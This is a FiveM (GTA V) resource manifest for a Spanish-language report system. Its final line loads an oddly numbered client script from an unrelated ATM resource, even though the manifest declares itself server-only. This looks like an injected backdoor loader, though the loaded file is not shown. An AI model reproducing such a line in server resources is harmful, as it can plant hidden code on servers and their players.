fx_version 'cerulean'
game 'gta5'
server_only 'yes'

author 'jimmy#5555'
description 'Sistema de Reportes para OneSync & OneSync Infinity.'
version '1.00'

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    '@es_extended/locale.lua',
	'locales/*.lua',
    'config.lua',
    'server/main.lua'
}
client_script '@esx_atm/48706.lua'